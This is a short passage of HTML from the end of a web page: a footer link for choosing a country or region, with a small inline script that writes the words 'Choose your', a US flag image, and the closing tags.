                <a class="choose" title="Choose your country or region" href="chooseyourcountry.html"><p style="display:inline;margin-right:-5px; padding-right:0px;"><SCRIPT TYPE="text/javascript"> document.write('Choose' + ' your') </SCRIPT> country or region</p><img class="img-22" src="images/usa.png" /></a></li>
               
        </ul>
</div>
</footer>



</body>
</html>